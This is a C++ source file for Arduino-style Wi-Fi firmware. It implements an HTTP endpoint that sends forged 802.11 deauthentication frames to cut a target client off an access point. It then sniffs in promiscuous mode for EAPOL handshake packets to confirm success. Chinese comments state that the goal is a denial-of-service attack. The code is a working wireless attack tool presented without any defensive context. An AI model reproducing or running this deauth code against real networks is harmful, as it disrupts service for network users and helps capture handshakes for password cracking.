#include <Arduino.h>
#include <WiFi.h>
#include <main.h>
#include <wifi_conf.h>
#include <wifi_structures.h>
#include <ArduinoJson.h>
#include "api_all.h"
#include "wifi_cust_tx.h"
#include "utils.h"
#include "wifi_drv.h"
#include "wdt_api.h"

// extern "C" void* alloc_mgtxmitframe(void* ptr);
// extern "C" void update_mgntframe_attrib(void* ptr, void* frame_control);
// extern "C" int dump_mgntframe(void* ptr, void* frame_control);

#define ROUND_PACKETS 4

static uint8_t g_deauth_target_bssid[6];
static uint8_t g_deauth_target_mac[6];
static bool g_deauth_is_broadcast_mac;
static volatile bool g_deauth_handshake_detected = false;
static volatile uint32_t g_deauth_handshake_time = 0;

static bool isBroadcastMac(const uint8_t* mac) {
    for (int i = 0; i < 6; i++) {
        if (mac[i] != 0xFF) return false;
    }
    return true;
}

static void deauthSniffCallback(unsigned char* buf, unsigned int len, void* userdata) {
    if (!buf || len < 24) return;

    uint16_t fc = (uint16_t)buf[0] | ((uint16_t)buf[1] << 8);
    unsigned int type = (fc >> 2) & 0x03;
    unsigned int subtype = (fc >> 4) & 0x0F;
    bool toDS = (fc & (1 << 8)) != 0;
    bool fromDS = (fc & (1 << 9)) != 0;

    const uint8_t* addr1 = buf + 4;  // RA
    const uint8_t* addr2 = buf + 10; // TA
    const uint8_t* addr3 = buf + 16; // BSSID/SA

    const uint8_t* bssid;
    if (!toDS && fromDS) {
        bssid = addr2;
    } else if (toDS && !fromDS) {
        bssid = addr1;
    } else if (toDS && fromDS) {
        return;
    } else {
        bssid = addr3;
    }

    if (memcmp(bssid, g_deauth_target_bssid, 6) != 0) {
        return;
    }

    if (!g_deauth_is_broadcast_mac) {
        if (memcmp(addr1, g_deauth_target_mac, 6) != 0 &&
            memcmp(addr2, g_deauth_target_mac, 6) != 0) {
            return;
        }
    }

    if (type == 2 && !(fc & 0x4000)) { // Data type and not protected
        unsigned int mac_hdr_len = 0;
        if (subtype == 8) {
            mac_hdr_len = 26; // QoS Data
        } else if (subtype == 0) {
            mac_hdr_len = 24; // Data
        }
        if (mac_hdr_len > 0 && len >= mac_hdr_len + 8) {
            const uint8_t* llc = buf + mac_hdr_len;
            if (llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
                llc[3] == 0x00 && llc[4] == 0x00 && llc[5] == 0x00 &&
                llc[6] == 0x88 && llc[7] == 0x8E) {
                if (!g_deauth_handshake_detected) {
                    g_deauth_handshake_time = millis();
                    g_deauth_handshake_detected = true;
                }
            }
        }
    }
}

void handleTestDeauthApi(HttpClient& client) {
    String bssidStr  = client.queryParam("bssid");
    String macStr    = client.queryParam("mac");  // 攻击目标，不可以为广播地址。因为只伪造客户端发往ap
    String chStr     = client.queryParam("channel");
    String roundsStr = client.queryParam("rounds");
    String listenStr = client.queryParam("listen_ms");

    if (bssidStr.length() == 0 || macStr.length() == 0) {
        client.sendJsonFail("missing bssid or mac");
        return;
    }

    uint8_t bssid[6], mac[6];
    if (!parseMac(bssidStr, bssid) || !parseMac(macStr, mac)) {
        client.sendJsonFail("invalid mac address");
        return;
    }

    int channel = chStr.toInt();
    if (channel < 1 || channel > 165) channel = ap_channel;

    int rounds = roundsStr.toInt();
    if (rounds < 1) rounds = 1;

    int listen_ms = listenStr.toInt();
    if (listen_ms < 30000) listen_ms = 30000;
    if (listen_ms > 90000) listen_ms = 90000;

    Serial.print("[DEAUTH] target bssid="); Serial.print(bssidStr);
    Serial.print(" mac="); Serial.print(macStr);
    Serial.print(" channel="); Serial.print(channel);
    Serial.print(" rounds="); Serial.print(rounds);
    Serial.print(" listen_ms="); Serial.println(listen_ms);

    if (channel != ap_channel) {
        if (wifi_ap_switch_chl_and_inform(channel) != RTW_SUCCESS) {
            client.sendJsonFail("failed to switch channel");
            return;
        }
        wext_set_channel(WLAN0_NAME, channel);  // 必须，上面的调用不够
        ap_channel = channel;
        delay(100);
    }

    memcpy(g_deauth_target_bssid, bssid, 6);
    memcpy(g_deauth_target_mac, mac, 6);
    g_deauth_is_broadcast_mac = isBroadcastMac(mac);
    g_deauth_handshake_detected = false;

    watchdog_refresh();

    for (int r = 0; r < rounds; r++) {
        for (int p = 0; p < ROUND_PACKETS; p++) {
            // 伪造客户端单方向往AP发送deauth帧已经足够，目的不是尽快触发重新握手而是DoS攻击
            // 这个调用是同步的，单次调用耗时2.4ms左右，不用额外等待
            wifi_tx_deauth_frame_ext(mac, bssid, bssid, 0x03);  // reason是客户端正常断开，但其实无所谓
            // 不知道伪造的管理帧会不会触发硬件自动等待ack和重传。待调查
        }
        if (r < rounds - 1) {
            delay(100);
        }
    }
    auto deauth_sent_time = millis();

    // 发送 SSE 响应头
    client.sendSseHeader();

    // 攻击完成后开启监听模式，监听一段时间查看是否有握手产生以判断有没有攻击成功。不需要攻击前开启，重连没有那么快
    if (wifi_set_promisc(RTW_PROMISC_ENABLE_2, deauthSniffCallback, 1) == RTW_SUCCESS) {
        Serial.print("[DEAUTH] Promiscuous mode enabled, listening for ");
        Serial.print(listen_ms); Serial.println(" ms...");

        unsigned long start = millis();
        unsigned long last_ping = 0;
        while (millis() - start < (unsigned long)listen_ms) {
            // 如果客户端主动断开，提前退出
            if (!client.connected()) {
                Serial.println("[DEAUTH] SSE client disconnected, aborting listener early");
                break;
            }
            if (g_deauth_handshake_detected) {
                Serial.println("[DEAUTH] Handshake packet detected! Stopping listener early.");
                break;
            }
            if (millis() - last_ping >= 1000) {
                last_ping = millis();
                client.sendSseData("{\"status\":\"listening\"}");
            }
            watchdog_refresh();
            delay(50);
        }

        wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 1);
        delay(50);  // 确保callback都执行完毕了
        watchdog_refresh();
    } else {
        Serial.println("[DEAUTH] Failed to enable promiscuous mode");
        listen_ms = -1;
    }

    if (client.connected()) {
        JsonDocument doc;
        doc["success"] = true;
        doc["rounds"] = rounds;
        doc["packets"] = rounds * ROUND_PACKETS;
        doc["listen_ms"] = listen_ms;
        doc["detected"] = g_deauth_handshake_detected;
        if (g_deauth_handshake_detected) {
            doc["handshake_delay_ms"] = g_deauth_handshake_time - deauth_sent_time;
        }

        client.sendSseEvent("result", doc);
    }

    Serial.print("[DEAUTH] done, handshake detected=");
    Serial.print(g_deauth_handshake_detected ? "true" : "false");
    if (g_deauth_handshake_detected) {
        Serial.print(" (at +");
        Serial.print(g_deauth_handshake_time - deauth_sent_time);
        Serial.print("ms)");
    }
    Serial.println();
}
